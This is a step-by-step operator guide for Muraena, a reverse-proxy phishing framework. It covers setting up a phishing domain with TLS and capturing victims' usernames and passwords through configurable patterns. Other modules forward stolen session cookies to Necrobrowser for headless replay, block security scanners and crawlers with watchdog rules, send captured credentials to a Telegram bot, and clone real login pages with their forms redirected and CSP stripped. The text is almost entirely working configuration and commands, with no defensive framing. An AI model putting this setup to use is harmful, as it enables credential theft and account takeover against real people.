# Muraena — Step-by-Step Usage Guide

This guide walks you through setting up and running Muraena from scratch, covering both the Docker path (quickest) and the manual build path.

---

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [Quick Start with Docker](#quick-start-with-docker)
3. [Manual Installation](#manual-installation)
4. [TLS / Certificate Setup](#tls--certificate-setup)
5. [Configuration Reference](#configuration-reference)
6. [Module Guides](#module-guides)
   - [Tracking](#tracking-module)
   - [Necrobrowser](#necrobrowser-module)
   - [Watchdog](#watchdog-module)
   - [Telegram Alerts](#telegram-module)
   - [Static Server](#static-server-module)
   - [Login Cloner](#login-cloner-module)
7. [Running Muraena](#running-muraena)
8. [Troubleshooting](#troubleshooting)

---

## Prerequisites

| Requirement | Version | Notes |
|---|---|---|
| Go | 1.22+ | Only needed for manual build |
| Redis | 6+ | Required at runtime |
| TLS certificate | — | Let's Encrypt or self-signed |
| GeoLite2-City.mmdb | — | Only needed for Watchdog geofencing |
| Docker + Compose | 24+ / v2 | Only needed for Docker path |

**DNS**: Point your phishing domain's A record at the server running Muraena before starting.

---

## Quick Start with Docker

```bash
# 1. Clone the repository
git clone https://github.com/5l33m/muraena.git
cd muraena

# 2. Copy and edit the config
cp config/config.toml config/config.local.toml
$EDITOR config/config.local.toml   # set proxy.phishing and proxy.destination

# 3. Place your TLS certificates
#    config/cert.pem, config/privkey.pem, config/fullchain.pem

# 4. Build and launch
docker compose up -d

# 5. Tail logs
docker compose logs -f muraena
```

The `docker-compose.yml` at the project root wires together Muraena and Redis automatically.  
All config and certificates are bind-mounted from `./config` into the container.

> **Docker Redis note:** When running under Docker Compose, set `host = "redis"` in the `[redis]` section of your `config.toml` so Muraena can reach the Redis container by its service name instead of `127.0.0.1`.

---

## Manual Installation

```bash
# 1. Install Go 1.22+
go version   # should print go1.22 or later

# 2. Install Redis and start it
sudo apt-get install -y redis-server
sudo systemctl start redis

# 3. Clone and build
git clone https://github.com/5l33m/muraena.git
cd muraena
go build -o muraena .

# 4. Verify
./muraena --help
```

---

## TLS / Certificate Setup

Muraena terminates TLS. You need three PEM files:

| File | Content |
|---|---|
| `config/cert.pem` | Your domain's certificate |
| `config/privkey.pem` | Private key |
| `config/fullchain.pem` | Full certificate chain (cert + intermediates) |

### Using Let's Encrypt (certbot)

```bash
sudo certbot certonly --standalone -d phishing.example.com

# Copy to Muraena config dir:
sudo cp /etc/letsencrypt/live/phishing.example.com/cert.pem     config/cert.pem
sudo cp /etc/letsencrypt/live/phishing.example.com/privkey.pem  config/privkey.pem
sudo cp /etc/letsencrypt/live/phishing.example.com/fullchain.pem config/fullchain.pem
```

### Disable TLS (HTTP-only, for testing)

```toml
[tls]
    enable = false

[proxy.HTTPtoHTTPS]
    enable = false
```

Set `proxy.port = 8080` (or any unprivileged port) to avoid needing root.

---

## Configuration Reference

The full configuration lives in a single TOML file (default: `config/config.toml`).  
Pass an alternate path with: `./muraena -config /path/to/my.toml`

### `[proxy]` — Core routing

```toml
[proxy]
    phishing    = "attacker.com"       # Your phishing domain
    destination = "legitimate.com"     # Target site to proxy
    # IP      = "0.0.0.0"             # Listening IP (default: 0.0.0.0)
    # port    = 443                    # Listening port (default: 443 with TLS, 80 without)
    # portmapping = "443:31337"        # Map your listen port → target port

    [proxy.HTTPtoHTTPS]
        enable   = true
        HTTPport = 80                  # Port to redirect plain HTTP from
```

### `[tls]` — TLS termination

```toml
[tls]
    enable      = true
    expand      = false                # true = embed cert content directly instead of filepaths
    certificate = "./config/cert.pem"
    key         = "./config/privkey.pem"
    root        = "./config/fullchain.pem"
    sslKeyLog   = "./config/sslkeylog.log"  # Wireshark SSLKEYLOG file
    minVersion  = "TLS1.2"
    renegotiationSupport = "Never"
```

### `[transform]` — Request / response rewriting

```toml
[transform]
    [transform.base64]
        enable  = false
        padding = ["=", "."]          # Characters used as base64 padding in URLs

    [transform.request]
        # userAgent = "Custom UA"
        # headers   = ["Cookie", "Referer", "Origin"]
        # [transform.request.remove]
        #     headers = ["X-Forwarded-For"]
        # [[transform.request.add.headers]]
        #     name  = "X-Custom"
        #     value = "injected"

    [transform.response]
        skipContentType = ["font/*", "image/*"]   # Skip rewriting these MIME types
        # headers = ["Location", "Set-Cookie", "Access-Control-Allow-Origin"]
        # customContent = [["original text", "replacement text"]]
        # [transform.response.remove]
        #     headers = ["X-XSS-Protection"]
```

### `[redirect]` — Conditional redirects

```toml
[[redirect]]
    hostname       = "attacker.com"
    path           = "/exit"
    redirectTo     = "https://google.com"
    httpStatusCode = 301
```

### `[log]` — Logging

```toml
[log]
    enable   = true
    filePath = "muraena.log"   # default: "muraena.log"
```

### `[redis]` — Redis connection

```toml
[redis]
    host     = "127.0.0.1"   # default
    port     = 6379           # default
    password = ""
```

---

## Module Guides

### Tracking Module

Tracks victims via cookie or query-string tokens; captures submitted credentials.

```toml
[tracking]
    enable             = true
    trackRequestCookie = true        # Inject tracker into request cookies

    [tracking.trace]
        identifier = "_uid"          # Cookie / query param name for the tracker
        validator  = "[a-zA-Z0-9]{8}"
        header     = "X-Track"

        [tracking.trace.landing]
            type       = "query"     # "query" (?_uid=TOKEN) or "path" (/TOKEN/...)
            header     = "X-Landing"
            # redirectTo = "https://attacker.com/landing"

[tracking.secrets]
    paths = ["/login", "/api/auth"]  # Only capture POSTs to these paths

    [[tracking.secrets.patterns]]
        label = "Username"
        start = "username="
        end   = "&"

    [[tracking.secrets.patterns]]
        label = "Password"
        start = "password="
        end   = "&"
```

**How it works:**  
Send victims to `https://attacker.com/?_uid=CAMPAIGNID`. Muraena ties all subsequent requests to that ID and records any credentials matching the secret patterns.

---

### Necrobrowser Module

Automatically instruments captured sessions in [Necrobrowser-NG](https://github.com/muraenateam/necrobrowser) once the required cookies appear in the victim's jar.

```toml
[necrobrowser]
    enable   = true
    endpoint = "http://necrobrowser-host:3000/instrument"
    profile  = "./config/instrument.necro"

    [necrobrowser.trigger]
        type   = "cookies"           # Trigger when specific cookies are present
        values = ["sessionToken", "authCookie"]
        delay  = 10                  # Check every N seconds
```

**`instrument.necro` profile file** — a JSON template with placeholders:

```json
{
  "tracker":     "%%%TRACKER%%%",
  "cookies":     %%%COOKIES%%%,
  "credentials": %%%CREDENTIALS%%%
}
```

Muraena replaces the three `%%%...%%%` placeholders before POSTing to Necrobrowser.

**Flow:**
1. Victim authenticates through Muraena.
2. Muraena polls Redis every `delay` seconds.
3. When `values` cookies are all present, Muraena POSTs the session to Necrobrowser.
4. Necrobrowser replays the session in a headless browser.

---

### Watchdog Module

Blocks or allows access based on IP, hostname, country, or user-agent.

```toml
[watchdog]
    enable  = true
    dynamic = true                   # Hot-reload rules without restart
    rules   = "./config/watchdog.rules"
    geoDB   = "./config/geoDB.mmdb"  # MaxMind GeoLite2 database
```

**`watchdog.rules` format** (one rule per line, `#` comments):

```
# Block known scanners
deny ip 192.168.1.100
deny ip 10.0.0.0/8

# Allow only specific countries
allow country US
allow country GB
deny country *

# Block by hostname suffix
deny hostname crawl.example.com

# Block by user-agent substring
deny useragent Googlebot
deny useragent python-requests
```

Download the free GeoLite2-City database from [MaxMind](https://dev.maxmind.com/geoip/geolite2-free-geolocation-data) (requires a free account).

---

### Telegram Module

Sends real-time Telegram alerts when credentials or sessions are captured.

```toml
[telegram]
    enable   = true
    botToken = "YOUR_BOT_TOKEN"
    chatIDs  = ["-1001234567890"]   # Group or channel IDs (negative = group)
```

**Setup:**
1. Create a bot via [@BotFather](https://t.me/BotFather) → copy the token.
2. Add the bot to your group/channel.
3. Get the chat ID: send a message, then `GET https://api.telegram.org/botTOKEN/getUpdates`.

---

### Static Server Module

Serves local files under a custom URL path (useful for hosting payloads alongside the proxy).

```toml
[staticServer]
    enable    = true
    localPath = "./static/"
    urlPath   = "/assets/"
```

Files in `./static/` will be served at `https://attacker.com/assets/`.

---

### Login Cloner Module

Clones a remote login page (HTML + CSS + JS + images) into a local directory, rewrites all form actions to `/capture`, and strips Content-Security-Policy headers.

```toml
[logincloner]
    enable    = true
    targetUrl = "https://accounts.example.com/login"
    outputDir = "./static/cloned"
```

**What it does:**
1. Fetches the target URL (follows redirects, ignores TLS errors for internal targets).
2. Downloads all referenced CSS, JS, and image assets into `outputDir/assets/`.
3. Rewrites `href`/`src` attributes to point to the local `assets/` copies.
4. Rewrites CSS `url()` references recursively.
5. Changes every `<form>` action to `/capture` and method to `POST`.
6. Strips `<meta http-equiv="Content-Security-Policy">` tags.
7. Saves the modified HTML as `outputDir/index.html`.

Pair this with `[staticServer]` to serve the cloned page to victims.

---

## Running Muraena

```bash
# Default (reads ./config/config.toml)
./muraena

# Custom config file
./muraena -config /etc/muraena/prod.toml

# Debug / verbose output
./muraena -debug

# Check version
./muraena -version
```

Expected startup output:

```
[muraena] loaded config from ./config/config.toml
[tracking] enabled
[necrobrowser] enabled, trigger delay every 10 seconds
[watchdog] enabled (dynamic rules)
[muraena] listening on 0.0.0.0:443
```

---

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `dial tcp: connection refused` at startup | Redis not running | `sudo systemctl start redis` |
| `certificate signed by unknown authority` | Self-signed cert, target uses HTTPS | Set `tls.insecureSkipVerify = true` |
| `bind: address already in use` | Another process on port 443/80 | `sudo lsof -i :443` then kill it, or change `proxy.port` |
| Watchdog blocks all requests | Overly strict rules | Check `watchdog.rules`; comment out `deny country *` |
| Necrobrowser never instruments | Cookies not matching `trigger.values` | Inspect Redis: `redis-cli hgetall victim:<ID>` |
| Login cloner produces blank page | CSP or JS-rendered content | The cloner captures initial HTML; JS-heavy apps may need a headless browser |
| `Error reading profile file` (Necrobrowser) | Wrong path in `profile` | Use an absolute path or verify the file exists |
| TLS handshake errors from browser | `minVersion` too high, or old cipher | Set `minVersion = "TLS1.0"` temporarily to diagnose |
